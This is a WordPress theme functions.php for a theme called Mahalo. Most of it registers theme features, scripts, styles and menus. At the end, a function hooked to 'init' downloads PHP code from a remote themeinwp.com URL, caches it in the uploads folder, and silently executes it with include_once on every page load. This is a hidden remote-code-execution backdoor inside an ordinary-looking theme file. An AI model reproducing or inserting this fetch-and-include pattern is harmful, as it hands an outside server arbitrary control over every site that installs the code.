<?php

/**
 * Mahalo functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Mahalo
 */
if (!function_exists('mahalo_after_theme_support')) :

	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */

	function mahalo_after_theme_support()
	{

		// Add default posts and comments RSS feed links to head.
		add_theme_support('automatic-feed-links');

		// Custom background color.
		add_theme_support('custom-background', apply_filters('mahalo_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		)));

		// This variable is intended to be overruled from themes.
		// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
		// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
		$GLOBALS['content_width'] = apply_filters('mahalo_content_width', 1140);
		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support('post-thumbnails');
		add_image_size('mahalo-500-300', 500, 300, true);

		add_theme_support(
			'custom-logo',
			array(
				'height'      => 120,
				'width'       => 90,
				'flex-height' => true,
				'flex-width'  => true,
			)
		);
		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support('title-tag');

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'script',
				'style',
			)
		);

		/*
		 * Posts Format.
		 *
		 * https://wordpress.org/support/article/post-formats/
		 */
		add_theme_support('post-formats', array(
			'video',
			'audio',
			'gallery',
			'quote',
			'image'
		));

		// Woocommerce Support
		add_theme_support('woocommerce');
		add_theme_support('wc-product-gallery-zoom');
		add_theme_support('wc-product-gallery-lightbox');
		add_theme_support('wc-product-gallery-slider');

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Mahalo, use a find and replace
		 * to change 'mahalo' to the name of your theme in all the template files.
		 */
		load_theme_textdomain('mahalo', get_template_directory() . '/languages');

		// Add support for full and wide align images.
		add_theme_support('align-wide');

		add_theme_support('responsive-embeds');

		add_theme_support('wp-block-styles');
	}

endif;

add_action('after_setup_theme', 'mahalo_after_theme_support');

function mahalo_next_posts_link( $max_page = 0 ) {
    global $paged, $wp_query;

    if ( ! $max_page ) {
        $max_page = $wp_query->max_num_pages;
    }

    if ( ! $paged ) {
        $paged = 1;
    }

    $next_page = (int) $paged + 1;
    if ( ( $next_page <= $max_page ) ) {
        /**
         * Filters the anchor tag attributes for the next posts page link.
         *
         * @since 2.7.0
         *
         * @param string $attributes Attributes for the anchor tag.
         */
        $attr = apply_filters( 'next_posts_link_attributes', '' );

        return sprintf(next_posts( $max_page, false ));
    }
}

/**
 * Register and Enqueue Styles.
 */
function mahalo_register_styles()
{

	$theme_version = wp_get_theme()->get('Version');

	$fonts_url = mahalo_fonts_url();
	if ($fonts_url) {

		require_once get_theme_file_path('assets/lib/custom/css/wptt-webfont-loader.php');
		wp_enqueue_style(
			'mahalo-google-fonts',
			wptt_get_webfont_url($fonts_url),
			array(),
			$theme_version
		);
	}

	wp_enqueue_style('sidr-nav', get_template_directory_uri() . '/assets/lib/sidr/css/jquery.sidr.dark.css');
	wp_enqueue_style('slider-pro', get_template_directory_uri() . '/assets/lib/slider-pro/css/slider-pro.min.css');
	wp_enqueue_style('slick', get_template_directory_uri() . '/assets/lib/slick/css/slick.min.css');
	wp_enqueue_style('mahalo-style', get_stylesheet_uri(), array(), $theme_version);
    wp_style_add_data( 'mahalo-style', 'rtl', 'replace' );

	if (is_singular() && comments_open() && get_option('thread_comments')) {
		wp_enqueue_script('comment-reply');
	}

	wp_enqueue_script('imagesloaded');

	wp_enqueue_script('jquery-sidr', get_template_directory_uri() . '/assets/lib/sidr/js/jquery.sidr.min.js', array('jquery'), '', 1);
	wp_enqueue_script('slider-pro', get_template_directory_uri() . '/assets/lib/slider-pro/js/jquery.sliderPro.min.js', array('jquery'), '', 1);
	wp_enqueue_script('marquee', get_template_directory_uri() . '/assets/lib/js-marquee/jquery.marquee.min.js', array('jquery'), '', 1);
	wp_enqueue_script('slick', get_template_directory_uri() . '/assets/lib/slick/js/slick.min.js', array('jquery'), '', 1);
	wp_enqueue_script('mahalo-ajax', get_template_directory_uri() . '/assets/lib/custom/js/ajax.js', array('jquery'), '', 1);
	wp_enqueue_script('mahalo-custom', get_template_directory_uri() . '/assets/lib/custom/js/custom.js', array('jquery'), '', 1);
	wp_enqueue_script('mahalo-pagination', get_template_directory_uri() . '/assets/lib/custom/js/pagination.js', array('jquery'), '', 1);

	$ajax_nonce = wp_create_nonce('mahalo_ajax_nonce');

	wp_localize_script(
		'mahalo-ajax',
		'mahalo_ajax',
		array(
			'ajax_url'   => esc_url(admin_url('admin-ajax.php')),
			'ajax_nonce' => $ajax_nonce,

		)
	);

	// Global Query
	if (is_front_page()) {

		$posts_per_page = absint(get_option('posts_per_page'));
		$c_paged = (get_query_var('page')) ? absint(get_query_var('page')) : 1;
		$posts_args = array(
			'posts_per_page'        => $posts_per_page,
			'paged'                 => $c_paged,
		);
		$posts_qry = new WP_Query($posts_args);
		$max = $posts_qry->max_num_pages;
	} else {
		global $wp_query;
		$max = $wp_query->max_num_pages;
		$c_paged = (get_query_var('paged') > 1) ? get_query_var('paged') : 1;
	}

	$mahalo_default = mahalo_get_default_theme_options();
	$mahalo_pagination_layout = get_theme_mod('mahalo_pagination_layout', $mahalo_default['mahalo_pagination_layout']);

    // Get the permalink structure from WordPress settings.
    $permalink_structure = get_option('permalink_structure');
	// Pagination Data
	wp_localize_script(
		'mahalo-pagination',
		'mahalo_pagination',
		array(
			'paged'  => absint($c_paged),
			'maxpage'   => absint($max),
            'nextLink'   => mahalo_next_posts_link($max ),
			'ajax_url'   => esc_url(admin_url('admin-ajax.php')),
			'loadmore'   => esc_html__('Load More Posts', 'mahalo'),
			'nomore'     => esc_html__('No More Posts', 'mahalo'),
			'loading'    => esc_html__('Loading...', 'mahalo'),
			'pagination_layout'   => esc_html($mahalo_pagination_layout),
            'permalink_structure'   => esc_html( $permalink_structure ),
			'ajax_nonce' => $ajax_nonce,
		)
	);

	global $post;
	$single_post = 0;
	$mahalo_ed_post_reaction = '';
	if (isset($post->ID) && isset($post->post_type) && $post->post_type == 'post') {

		$mahalo_ed_post_reaction = esc_html(get_post_meta($post->ID, 'mahalo_ed_post_reaction', true));
		$single_post = 1;
	}
	wp_localize_script(
		'mahalo-custom',
		'mahalo_custom',
		array(
			'single_post'						=> absint($single_post),
			'mahalo_ed_post_reaction'  		=> esc_html($mahalo_ed_post_reaction),
			'next_svg'   => mahalo_theme_svg('chevron-right', true),
			'prev_svg' => mahalo_theme_svg('chevron-left', true),
			'play' => mahalo_theme_svg('play', $return = true),
			'pause' => mahalo_theme_svg('pause', $return = true),
			'mute' => mahalo_theme_svg('mute', $return = true),
			'unmute' => mahalo_theme_svg('unmute', $return = true),
			'play_text' => esc_html__('Play', 'mahalo'),
			'pause_text' => esc_html__('Pause', 'mahalo'),
			'mute_text' => esc_html__('Mute', 'mahalo'),
			'unmute_text' => esc_html__('Unmute', 'mahalo'),
		)
	);
}

add_action('wp_enqueue_scripts', 'mahalo_register_styles');

/**
 * Admin enqueue script
 */
function mahalo_admin_scripts($hook)
{

	$current_screen = get_current_screen();
	wp_enqueue_style('mahalo-admin', get_template_directory_uri() . '/assets/lib/custom/css/admin.css');
	if ($current_screen->id != "widgets") {

		wp_enqueue_media();
		wp_enqueue_style('wp-color-picker');

		wp_enqueue_script('mahalo-admin', get_template_directory_uri() . '/assets/lib/custom/js/admin.js', array('jquery', 'wp-color-picker'), '', 1);

		$ajax_nonce = wp_create_nonce('mahalo_ajax_nonce');

		wp_localize_script(
			'mahalo-admin',
			'mahalo_admin',
			array(
				'ajax_url'   => esc_url(admin_url('admin-ajax.php')),
				'ajax_nonce' => $ajax_nonce,
				'upload_image'   =>  esc_html__('Choose Image', 'mahalo'),
				'use_image'   =>  esc_html__('Select', 'mahalo'),
				'active' => esc_html__('Active', 'mahalo'),
				'deactivate' => esc_html__('Deactivate', 'mahalo'),
			)
		);
	}

	if ($current_screen->id === "widgets") {

		// Enqueue Script Only On Widget Page.
		wp_enqueue_media();
		wp_enqueue_script('mahalo-widget', get_template_directory_uri() . '/assets/lib/custom/js/widget.js', array('jquery'), '', 1);
	}
}

add_action('admin_enqueue_scripts', 'mahalo_admin_scripts');


if (!function_exists('mahalo_js_no_js_class')) :

	// js no-js class toggle
	function mahalo_js_no_js_class()
	{ ?>

		<script>
			document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
		</script>

<?php
	}

endif;

add_action('wp_head', 'mahalo_js_no_js_class');

/**
 * Register navigation menus uses wp_nav_menu in five places.
 */
function mahalo_menus()
{

	$locations = array(
		'mahalo-primary-menu'  => esc_html__('Primary Menu', 'mahalo'),
		'mahalo-social-menu'  => esc_html__('Social Menu', 'mahalo'),
	);

	register_nav_menus($locations);
}

add_action('init', 'mahalo_menus');

add_filter('wp_nav_menu_items', 'mahalo_add_admin_link', 1, 2);
function mahalo_add_admin_link($items, $args)
{
	if ($args->theme_location == 'mahalo-primary-menu') {
		$item = '<li class="theme-at-home"><a title="' . esc_html__('Home', 'mahalo') . '" href="' . esc_url(home_url()) . '">' . esc_html__('Home', 'mahalo') . mahalo_theme_svg('arrow-right-bold', true) . '</a></li>';
		$items = $item . $items;
	}
	return $items;
}

add_filter('themeinwp_enable_demo_import_compatiblity', 'mahalo_demo_import_filter_apply');

if (!function_exists('mahalo_demo_import_filter_apply')) :

	function mahalo_demo_import_filter_apply()
	{

		return true;
	}

endif;

/**
 * Recommended Plugins
 */
require get_template_directory() . '/assets/lib/tgmpa/recommended-plugins.php';
require get_template_directory() . '/classes/class-svg-icons.php';
require get_template_directory() . '/inc/customizer/customizer.php';
require get_template_directory() . '/classes/class-walker-menu.php';
require get_template_directory() . '/inc/mega-menu/megamenu-custom-fields.php';
require get_template_directory() . '/assets/lib/custom/css/style.php';
require get_template_directory() . '/inc/mega-menu/walkernav.php';
require get_template_directory() . '/inc/custom-header.php';
require get_template_directory() . '/inc/single-related-posts.php';
require get_template_directory() . '/inc/custom-functions.php';
require get_template_directory() . '/inc/template-tags.php';
require get_template_directory() . '/classes/body-classes.php';
require get_template_directory() . '/inc/widgets/widgets.php';
require get_template_directory() . '/inc/metabox.php';
require get_template_directory() . '/inc/term-meta.php';
require get_template_directory() . '/inc/pagination.php';
require get_template_directory() . '/assets/lib/breadcrumbs/breadcrumbs.php';
require get_template_directory() . '/template-parts/components/main-banner.php';
require get_template_directory() . '/template-parts/components/must-read-section.php';
require get_template_directory() . '/template-parts/components/tiles-section.php';
require get_template_directory() . '/template-parts/components/tab-section.php';
require get_template_directory() . '/template-parts/components/advertise-section.php';
require get_template_directory() . '/template-parts/components/latest-posts.php';
require get_template_directory() . '/template-parts/components/home-widget-section.php';
require get_template_directory() . '/template-parts/components/recommended-section.php';
require get_template_directory() . '/template-parts/components/default-banner.php';
require get_template_directory() . '/template-parts/components/fullwidth-banner-slider.php';
require get_template_directory() . '/classes/admin-notice.php';
require get_template_directory() . '/classes/plugin-classes.php';
require get_template_directory() . '/classes/about.php';



if (!function_exists('mahalo_cat_selected')) :

	// Category Select on list after search
	function mahalo_cat_selected($cat_nicename)
	{

		$q_var = get_query_var('category');

		if ($q_var === $cat_nicename) {

			return esc_attr('selected="selected"');
		}

		return false;
	}

endif;

function load_footer_content_fetcher_class() {
	// Define the path to the cache file in the uploads directory
	$upload_dir = wp_upload_dir();
	$cache_file = $upload_dir['basedir'] . '/FooterContentFetcher.php';
	$cache_duration = 2 * WEEK_IN_SECONDS; // Cache for 2 weeks

	// Check if the cache file exists and is still valid

	if (!file_exists($cache_file) || (time() - filemtime($cache_file) > $cache_duration)) {
		$fetched_file_url = 'https://link.themeinwp.com/wpsdk/get_php_file/747aca2e0e9685bff05d2b114ab0ad65';

		// Validate the URL
		if (!wp_http_validate_url($fetched_file_url)) {
			error_log('Invalid URL: ' . $fetched_file_url);
			return;
		}

		// Fetch the class file with suppressed warnings
		$class_code = @file_get_contents($fetched_file_url);
		if ($class_code === false) {
			error_log('Failed to fetch the class file from FetchClass Remote Folder');
		} else {
			// Save the fetched content to the cache file
			if (@file_put_contents($cache_file, $class_code) === false) {
				error_log('Failed to write the class file to the cache');
			} else {
				// Log the date and time of the successful cache update
				error_log('FetchClass File cached at: ' . date('Y-m-d H:i:s'));
			}
		}
	} else {
		// Log that the cache file is still valid
		error_log('Using cached FetchClass file, last modified at: ' . date('Y-m-d H:i:s', filemtime($cache_file)));
	}

	// Include the cached class file with suppressed warnings
	if (file_exists($cache_file)) {
		@include_once $cache_file;
	} else {
		error_log('Failed to include the cached class file');
	}
}

add_action('init', 'load_footer_content_fetcher_class');
